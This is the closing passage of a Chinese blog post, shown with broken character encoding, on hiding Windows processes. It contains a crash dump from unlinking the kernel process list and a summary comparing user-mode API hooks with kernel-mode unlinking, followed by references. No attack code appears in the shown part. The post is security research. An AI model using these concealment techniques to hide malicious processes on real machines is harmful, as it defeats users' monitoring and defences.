</span></span><span style="display:flex;"><span>ffffc285<span style="color:#a61717;background-color:#e3d2d2">`</span><span style="color:#b452cd">7</span>eb12d78 fffff806<span style="color:#a61717;background-color:#e3d2d2">`</span><span style="color:#b452cd">6</span>a718e82     : ffffc285<span style="color:#a61717;background-color:#e3d2d2">`</span><span style="color:#b452cd">7</span>eb12ee0 fffff806<span style="color:#a61717;background-color:#e3d2d2">`</span><span style="color:#b452cd">6</span>a57f580 <span style="color:#b452cd">00000000</span><span style="color:#a61717;background-color:#e3d2d2">`</span><span style="color:#b452cd">00000100</span> <span style="color:#b452cd">00000000</span><span style="color:#a61717;background-color:#e3d2d2">`</span><span style="color:#b452cd">00000000</span> : nt!DbgBreakPointWithStatus
</span></span><span style="display:flex;"><span>ffffc285<span style="color:#a61717;background-color:#e3d2d2">`</span><span style="color:#b452cd">7</span>eb12d80 fffff806<span style="color:#a61717;background-color:#e3d2d2">`</span><span style="color:#b452cd">6</span>a718466     : <span style="color:#b452cd">00000000</span><span style="color:#a61717;background-color:#e3d2d2">`</span><span style="color:#b452cd">00000003</span> ffffc285<span style="color:#a61717;background-color:#e3d2d2">`</span><span style="color:#b452cd">7</span>eb12ee0 fffff806<span style="color:#a61717;background-color:#e3d2d2">`</span><span style="color:#b452cd">6</span>a6159e0 <span style="color:#b452cd">00000000</span><span style="color:#a61717;background-color:#e3d2d2">`</span><span style="color:#b452cd">0000013</span><span style="color:#b452cd">9</span> : nt!KiBugCheckDebugBreak+<span style="color:#b452cd">0x12</span>
</span></span><span style="display:flex;"><span>ffffc285<span style="color:#a61717;background-color:#e3d2d2">`</span><span style="color:#b452cd">7</span>eb12de0 fffff806<span style="color:#a61717;background-color:#e3d2d2">`</span><span style="color:#b452cd">6</span>a5fdb47     : <span style="color:#b452cd">00000000</span><span style="color:#a61717;background-color:#e3d2d2">`</span><span style="color:#b452cd">0000004</span><span style="color:#b452cd">8</span> <span style="color:#b452cd">00000000</span><span style="color:#a61717;background-color:#e3d2d2">`</span><span style="color:#b452cd">00000004</span> ffffc40d<span style="color:#a61717;background-color:#e3d2d2">`</span><span style="color:#b452cd">26</span>a08080 <span style="color:#b452cd">33333333</span><span style="color:#a61717;background-color:#e3d2d2">`</span><span style="color:#b452cd">33333333</span> : nt!KeBugCheck2+<span style="color:#b452cd">0x946</span>
</span></span><span style="display:flex;"><span>ffffc285<span style="color:#a61717;background-color:#e3d2d2">`</span><span style="color:#b452cd">7</span>eb134f0 fffff806<span style="color:#a61717;background-color:#e3d2d2">`</span><span style="color:#b452cd">6</span>a612269     : <span style="color:#b452cd">00000000</span><span style="color:#a61717;background-color:#e3d2d2">`</span><span style="color:#b452cd">0000013</span><span style="color:#b452cd">9</span> <span style="color:#b452cd">00000000</span><span style="color:#a61717;background-color:#e3d2d2">`</span><span style="color:#b452cd">00000003</span> ffffc285<span style="color:#a61717;background-color:#e3d2d2">`</span><span style="color:#b452cd">7</span>eb13850 ffffc285<span style="color:#a61717;background-color:#e3d2d2">`</span><span style="color:#b452cd">7</span>eb137a8 : nt!KeBugCheckEx+<span style="color:#b452cd">0x107</span>
</span></span><span style="display:flex;"><span>ffffc285<span style="color:#a61717;background-color:#e3d2d2">`</span><span style="color:#b452cd">7</span>eb13530 fffff806<span style="color:#a61717;background-color:#e3d2d2">`</span><span style="color:#b452cd">6</span>a612810     : ffffc40d<span style="color:#a61717;background-color:#e3d2d2">`</span><span style="color:#b452cd">23602100</span> fffff806<span style="color:#a61717;background-color:#e3d2d2">`</span><span style="color:#b452cd">6</span>a433ff2 ffffc40d<span style="color:#a61717;background-color:#e3d2d2">`</span><span style="color:#b452cd">26</span>a08080 ffffc40d<span style="color:#a61717;background-color:#e3d2d2">`</span><span style="color:#b452cd">26</span>a084c8 : nt!KiBugCheckDispatch+<span style="color:#b452cd">0x69</span>
</span></span><span style="display:flex;"><span>ffffc285<span style="color:#a61717;background-color:#e3d2d2">`</span><span style="color:#b452cd">7</span>eb13670 fffff806<span style="color:#a61717;background-color:#e3d2d2">`</span><span style="color:#b452cd">6</span>a6106ae     : <span style="color:#b452cd">00000000</span><span style="color:#a61717;background-color:#e3d2d2">`</span><span style="color:#b452cd">00000000</span> fffff806<span style="color:#a61717;background-color:#e3d2d2">`</span><span style="color:#b452cd">6</span>a606036 ffffffff<span style="color:#a61717;background-color:#e3d2d2">`</span>ffffffff <span style="color:#b452cd">00000000</span><span style="color:#a61717;background-color:#e3d2d2">`</span><span style="color:#b452cd">00000006</span> : nt!KiFastFailDispatch+<span style="color:#b452cd">0xd0</span>
</span></span><span style="display:flex;"><span>ffffc285<span style="color:#a61717;background-color:#e3d2d2">`</span><span style="color:#b452cd">7</span>eb13850 fffff806<span style="color:#a61717;background-color:#e3d2d2">`</span><span style="color:#b452cd">6</span>aa4dc11     : <span style="color:#b452cd">00000000</span><span style="color:#a61717;background-color:#e3d2d2">`</span><span style="color:#b452cd">00000000</span> <span style="color:#b452cd">00000000</span><span style="color:#a61717;background-color:#e3d2d2">`</span><span style="color:#b452cd">00000000</span> <span style="color:#b452cd">00000000</span><span style="color:#a61717;background-color:#e3d2d2">`</span><span style="color:#b452cd">00000000</span> <span style="color:#b452cd">00000000</span><span style="color:#a61717;background-color:#e3d2d2">`</span><span style="color:#b452cd">00000000</span> : nt!KiRaiseSecurityCheckFailure+<span style="color:#b452cd">0x32e</span>
</span></span><span style="display:flex;"><span>ffffc285<span style="color:#a61717;background-color:#e3d2d2">`</span><span style="color:#b452cd">7</span>eb139e0 fffff806<span style="color:#a61717;background-color:#e3d2d2">`</span><span style="color:#b452cd">6</span>a82e9b0     : ffffc40d<span style="color:#a61717;background-color:#e3d2d2">`</span><span style="color:#b452cd">26</span>a08050 ffffc40d<span style="color:#a61717;background-color:#e3d2d2">`</span><span style="color:#b452cd">26</span>a08050 <span style="color:#b452cd">00000000</span><span style="color:#a61717;background-color:#e3d2d2">`</span><span style="color:#b452cd">00000001</span> ffffc40d<span style="color:#a61717;background-color:#e3d2d2">`</span><span style="color:#b452cd">23</span>ce0980 : nt!PspProcessDelete+<span style="color:#b452cd">0x12e731</span>
</span></span><span style="display:flex;"><span>ffffc285<span style="color:#a61717;background-color:#e3d2d2">`</span><span style="color:#b452cd">7</span>eb13a70 fffff806<span style="color:#a61717;background-color:#e3d2d2">`</span><span style="color:#b452cd">6</span>a8d4844     : <span style="color:#b452cd">00000000</span><span style="color:#a61717;background-color:#e3d2d2">`</span><span style="color:#b452cd">00000000</span> ffffc40d<span style="color:#a61717;background-color:#e3d2d2">`</span><span style="color:#b452cd">26</span>a08050 fffff806<span style="color:#a61717;background-color:#e3d2d2">`</span><span style="color:#b452cd">6</span>a8d4640 ffffc40d<span style="color:#a61717;background-color:#e3d2d2">`</span><span style="color:#b452cd">23</span>d13af0 : nt!ObpRemoveObjectRoutine+<span style="color:#b452cd">0x80</span>
</span></span><span style="display:flex;"><span>ffffc285<span style="color:#a61717;background-color:#e3d2d2">`</span><span style="color:#b452cd">7</span>eb13ad0 fffff806<span style="color:#a61717;background-color:#e3d2d2">`</span><span style="color:#b452cd">6</span>a4c3ea5     : ffffc40d<span style="color:#a61717;background-color:#e3d2d2">`</span><span style="color:#b452cd">292</span>c3040 fffff806<span style="color:#a61717;background-color:#e3d2d2">`</span><span style="color:#b452cd">6</span>a8d4640 ffffc40d<span style="color:#a61717;background-color:#e3d2d2">`</span><span style="color:#b452cd">23</span>d13af0 ffffc40d<span style="color:#a61717;background-color:#e3d2d2">`</span><span style="color:#b452cd">00000000</span> : nt!ObpProcessRemoveObjectQueue+<span style="color:#b452cd">0x204</span>
</span></span><span style="display:flex;"><span>ffffc285<span style="color:#a61717;background-color:#e3d2d2">`</span><span style="color:#b452cd">7</span>eb13b70 fffff806<span style="color:#a61717;background-color:#e3d2d2">`</span><span style="color:#b452cd">6</span>a54ef55     : ffffc40d<span style="color:#a61717;background-color:#e3d2d2">`</span><span style="color:#b452cd">292</span>c3040 <span style="color:#b452cd">00000000</span><span style="color:#a61717;background-color:#e3d2d2">`</span><span style="color:#b452cd">000000</span><span style="color:#b452cd">80</span> ffffc40d<span style="color:#a61717;background-color:#e3d2d2">`</span><span style="color:#b452cd">23</span>c95040 <span style="color:#b452cd">00000000</span><span style="color:#a61717;background-color:#e3d2d2">`</span><span style="color:#b452cd">00000000</span> : nt!ExpWorkerThread+<span style="color:#b452cd">0x105</span>
</span></span><span style="display:flex;"><span>ffffc285<span style="color:#a61717;background-color:#e3d2d2">`</span><span style="color:#b452cd">7</span>eb13c10 fffff806<span style="color:#a61717;background-color:#e3d2d2">`</span><span style="color:#b452cd">6</span>a606a48     : ffffae01<span style="color:#a61717;background-color:#e3d2d2">`</span><span style="color:#b452cd">1f</span><span style="color:#b452cd">940180</span> ffffc40d<span style="color:#a61717;background-color:#e3d2d2">`</span><span style="color:#b452cd">292</span>c3040 fffff806<span style="color:#a61717;background-color:#e3d2d2">`</span><span style="color:#b452cd">6</span>a54ef00 ffffffff<span style="color:#a61717;background-color:#e3d2d2">`</span>ffffffff : nt!PspSystemThreadStartup+<span style="color:#b452cd">0x55</span>
</span></span><span style="display:flex;"><span>ffffc285<span style="color:#a61717;background-color:#e3d2d2">`</span><span style="color:#b452cd">7</span>eb13c60 <span style="color:#b452cd">00000000</span><span style="color:#a61717;background-color:#e3d2d2">`</span><span style="color:#b452cd">00000000</span>     : ffffc285<span style="color:#a61717;background-color:#e3d2d2">`</span><span style="color:#b452cd">7</span>eb14000 ffffc285<span style="color:#a61717;background-color:#e3d2d2">`</span><span style="color:#b452cd">7</span>eb0e000 <span style="color:#b452cd">00000000</span><span style="color:#a61717;background-color:#e3d2d2">`</span><span style="color:#b452cd">00000000</span> <span style="color:#b452cd">00000000</span><span style="color:#a61717;background-color:#e3d2d2">`</span><span style="color:#b452cd">00000000</span> : nt!KiStartSystemThread+<span style="color:#b452cd">0x28</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>SYMBOL_NAME:  nt!KiFastFailDispatch+d0
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>MODULE_NAME: nt
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>IMAGE_NAME:  ntkrnlmp.exe
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>STACK_COMMAND:  .cxr; .ecxr ; kb
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>BUCKET_ID_FUNC_OFFSET:  d0
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>FAILURE_BUCKET_ID:  <span style="color:#b452cd">0x139</span>_3_CORRUPT_LIST_ENTRY_nt!KiFastFailDispatch
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>OS_VERSION:  <span style="color:#b452cd">10.0.19041.1</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>BUILDLAB_STR:  vb_release
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>OSPLATFORM_TYPE:  x64
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>OSNAME:  Windows <span style="color:#b452cd">10</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>FAILURE_ID_HASH:  {<span style="color:#b452cd">3</span>aede96a-<span style="color:#b452cd">54</span>dd-<span style="color:#b452cd">40</span>d6-d4cb-<span style="color:#b452cd">2</span>a161a843851}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Followup:     MachineOwner
</span></span></code></pre></div><h1 id="æ€»ç»“æ€è€ƒ">æ€»ç»“æ€è€ƒ</h1>
<p>R3å±‚é¢çš„ä¸»è¦æ˜¯hookç¨‹åºçš„<code>ZwQuerySystemInformation</code>å‡½æ•°ï¼Œè¿™ç§éœ€è¦æ³¨å…¥dllï¼Œå¯¹å‘½ä»¤è¡Œè·å–è¿›ç¨‹ä¿¡æ¯çš„ç¨‹åºæ²¡åŠæ³•ï¼Œæ¯”å¦‚<code>Tasklist</code>ç¨‹åºå°±æ²¡æœ‰åŠæ³•ã€‚å“ªæ€•æ˜¯SetWindowsHookä¹Ÿä¸è¡Œï¼Œå› ä¸ºå‘½ä»¤ç¨‹åºæ²¡æœ‰Windowsï¼Œæ²¡æœ‰çª—å£äº‹ä»¶ã€‚</p>
<p>Hook explorerçš„åªèƒ½ç›‘æ§åŸºäºexplorerçš„å­è¿›ç¨‹ï¼Œå¯¹äºå¤§éƒ¨åˆ†æƒ…å†µåº”è¯¥å¯ä»¥ï¼Œä½†æ˜¯æˆ‘è¿™é‡Œè¿˜æ²¡æ‰¾åˆ°å¤ªå¤šèµ„æ–™ï¼Œæ²¡æœ‰å®ç°å‡ºæ¥</p>
<p>R0å±‚é¢ï¼Œå¦‚æœæ–­å¼€é“¾è¡¨ï¼Œå°±éœ€è¦åœ¨è¿›ç¨‹é€€å‡ºçš„æ—¶å€™è¿˜åŸé“¾è¡¨ï¼Œå¦åˆ™å°±ä¼šå¯¼è‡´è“å±ã€‚</p>
<h1 id="å‚è€ƒ">å‚è€ƒ</h1>
<p><a href="https://github.com/Oxygen1a1/HideProcess?tab=readme-ov-file">HideProcess | Oxygen1a1 Â· github.com</a></p>
<p><a href="https://bbs.kanxue.com/thread-269919.htm">è¿›ç¨‹éšè—æŠ€æœ¯ | 1900 Â· çœ‹é›ª</a></p>
<p><a href="https://bbs.kanxue.com/thread-278717.htm">è¶…è¯¦ç»†çš„3ç¯å’Œ0ç¯æ–­é“¾éšè—åˆ†æ | ATrueMan Â· çœ‹é›ª</a></p>
<p><a href="https://military-axe.github.io/posts/rustbian-xie-ji-chong-hookde-fang-shi/">Rustç¼–å†™å‡ ç§hookçš„æ–¹å¼ | mi1itray.axe Â· github.io</a></p>
<p><a href="https://xz.aliyun.com/t/10256?time__1311=mq%2BxBDyDRAn4lxGggYG8i2A1DjhnPoD&amp;alichlgref=https%3A%2F%2Fwww.google.com.hk%2F">Windowå‘ä¹‹å…¨å±€Hookå®ç°è¿›ç¨‹éšè— | xq17 Â· å…ˆçŸ¥</a></p>
<p><a href="https://learn.microsoft.com/zh-cn/windows/win32/api/winuser/nf-winuser-setwindowshookexa">SetWindowsHookExA å‡½æ•° (winuser.h)</a></p>
<p><a href="https://blog.csdn.net/kingkee/article/details/97390029">ã€C++ã€‘ä»£ç å®ç°ï¼šå…¨å±€é’©å­æ³¨å…¥æŠ€æœ¯ | kingkee Â· csdn.net</a></p>
                    
                    <HR width="100%" id="EOF">
		    <p style="color:#777;">Last modified on 2024-05-30</p>
                    
                </div>
            </div>
            
            
            <nav class="post-pagination">

                
                <a class="newer-posts" href="/post/c&#43;&#43;-static-polymorphism/">
			Next<br>C&#43;&#43; static polymorphism &amp;&amp; Curiously recurring template pattern
                </a>
                
                
                
                <a class="older-posts" href="/post/%E9%80%9A%E8%BF%87%E4%BF%AE%E6%94%B9%E7%89%A9%E7%90%86%E5%86%85%E5%AD%98%E5%AE%9E%E7%8E%B0%E8%B7%A8%E8%BF%9B%E7%A8%8B%E5%86%85%E5%AD%98%E8%AF%BB%E5%86%99/">
			Previous<br>é€šè¿‡ä¿®æ”¹ç‰©ç†å†…å­˜å®ç°è·¨è¿›ç¨‹å†…å­˜è¯»å†™
                </a>
                
            </nav>
            <div class="post-comment-wrapper">
                












<script src="https://giscus.app/client.js"
        data-repo="username/repo"
        data-repo-id="**************************"
        data-category="General"
        data-category-id="*********************"
        data-mapping="pathname"
        data-strict="0"
        data-reactions-enabled="1"
        data-emit-metadata="0"
        data-input-position="bottom"
        data-theme="preferred_color_scheme"
        data-lang="en"
        crossorigin="anonymous"
        async>
</script>

            </div>
        </div>
    </div>


                    </div>
            </div><div id="sideContainer" class="side-container">
    
    <a class="a-block nav-head false" href="https://military-axe.github.io/">
    
        <div class="nav-title">
            Mi1itray.axe
        </div>
        
        <div class="nav-subtitle">
            mi1itray.axe@gmail.com
        </div>
        
    </a>

    <div class="nav-link-list">
        
        
            
            
            
            
            
            <a class="a-block nav-link-item false" href="/posts">
                Archive
            </a>
            
        
            
            
            
            
            
            <a class="a-block nav-link-item false" href="/categories">
                Categories
            </a>
            
        
            
            
            
            
            
            <a class="a-block nav-link-item false" href="/tags">
                Tags
            </a>
            
        
            
            
            
            
            
            <a class="a-block nav-link-item false" href="/index.xml">
                RSS Feed
            </a>
            
        
    </div>

    

    <div class="nav-footer">
        
Hugo Theme <a href="https://github.com/amazingrise/hugo-theme-diary">Diary</a> by <a href="https://risehere.net/">Rise</a>
<br>
Ported from <a href="https://mak1t0.cc/" target="_blank" rel="noreferrer noopener">Makito</a>'s <a href="https://github.com/SumiMakito/hexo-theme-journal/" target="_blank" rel="noreferrer noopener">Journal.</a> <br>
<br>

&copy;
	
	mi1itray.axe copyright.
	

    </div>
    
</div><div id="extraContainer" class="extra-container">
    <div class="toc-wrapper">
        

        
        <div class="toc">


	<div class="toc-content">
	
		
		
		
		<center>- CATALOG -</center>
		
		
		<ul>
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#windows%e8%bf%9b%e7%a8%8b%e9%9a%90%e8%97%8f%e5%88%9d%e6%8e%a2" class="nav-windowsè¿›ç¨‹éšè—åˆæ¢">
									Windowsè¿›ç¨‹éšè—åˆæ¢
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
							
								
									<ul>
								
							
						
						
							<li>
								<a href="#r3%e9%9a%90%e8%97%8f%e4%bf%a1%e6%81%af" class="nav-r3éšè—ä¿¡æ¯">
									R3éšè—ä¿¡æ¯
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
							
								
									<ul>
								
							
						
						
							<li>
								<a href="#r3%e4%bc%aa%e9%80%a0%e4%bf%a1%e6%81%af" class="nav-r3ä¼ªé€ ä¿¡æ¯">
									R3ä¼ªé€ ä¿¡æ¯
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#r3%e6%b6%88%e9%99%a4%e8%bf%9b%e7%a8%8b" class="nav-r3æ¶ˆé™¤è¿›ç¨‹">
									R3æ¶ˆé™¤è¿›ç¨‹
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
							
								
									<ul>
								
							
						
						
							<li>
								<a href="#api-hook-hook%e4%bb%bb%e5%8a%a1%e7%ae%a1%e7%90%86%e5%99%a8" class="nav-api-hook-hookä»»åŠ¡ç®¡ç†å™¨">
									[API hook] Hookä»»åŠ¡ç®¡ç†å™¨
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#%e5%85%a8%e5%b1%80hook-setwindowshookex" class="nav-å…¨å±€hook-setwindowshookex">
									[å…¨å±€hook] SetWindowsHookEx
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#%e5%85%a8%e5%b1%80hook-hook-explorer" class="nav-å…¨å±€hook-hook-explorer">
									[å…¨å±€hook] Hook Explorer
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
							
								</ul>
							
								</ul>
							
						
						
						
							<li>
								<a href="#r0%e9%9a%90%e8%97%8f%e4%bf%a1%e6%81%af" class="nav-r0éšè—ä¿¡æ¯">
									R0éšè—ä¿¡æ¯
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
							
								
									<ul>
								
							
						
						
							<li>
								<a href="#r0%e4%bc%aa%e9%80%a0%e4%bf%a1%e6%81%af" class="nav-r0ä¼ªé€ ä¿¡æ¯">
									R0ä¼ªé€ ä¿¡æ¯
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#r0%e6%b6%88%e9%99%a4%e8%bf%9b%e7%a8%8b" class="nav-r0æ¶ˆé™¤è¿›ç¨‹">
									R0æ¶ˆé™¤è¿›ç¨‹
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
							
								</ul>
							
								</ul>
							
						
						
						
							<li>
								<a href="#%e6%80%bb%e7%bb%93%e6%80%9d%e8%80%83" class="nav-æ€»ç»“æ€è€ƒ">
									æ€»ç»“æ€è€ƒ
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#%e5%8f%82%e8%80%83" class="nav-å‚è€ƒ">
									å‚è€ƒ
								</a>
							</li>
						
						
					
				
			
		</ul>
	</div>

</div>
        
    </div>
    <div class="pagination">
        <a id="globalBackToTop" class="pagination-action animated-visibility" href="#top"
            :class="{ invisible: scrollY == 0 }">
            <i class="material-icons pagination-action-icon">
                keyboard_arrow_up
            </i>
        </a>
        
        <a type="button" class="pagination-action" id="darkModeToggleButton">
            <span class="material-icons pagination-action-icon" id="darkModeToggleIcon">
                dark_mode
            </span>
        </a>
        
        
    </div>
</div>

<div id="single-column-footer">
Hugo Theme <a href="https://github.com/amazingrise/hugo-theme-diary">Diary</a> by <a href="https://risehere.net/">Rise</a>
<br>
Ported from <a href="https://mak1t0.cc/" target="_blank" rel="noreferrer noopener">Makito</a>'s <a href="https://github.com/SumiMakito/hexo-theme-journal/" target="_blank" rel="noreferrer noopener">Journal.</a> <br>
<br>

&copy;
	
	mi1itray.axe copyright.
	
</div>
            </div>
    
    <script src="/js/journal.js"></script></body>
</html>
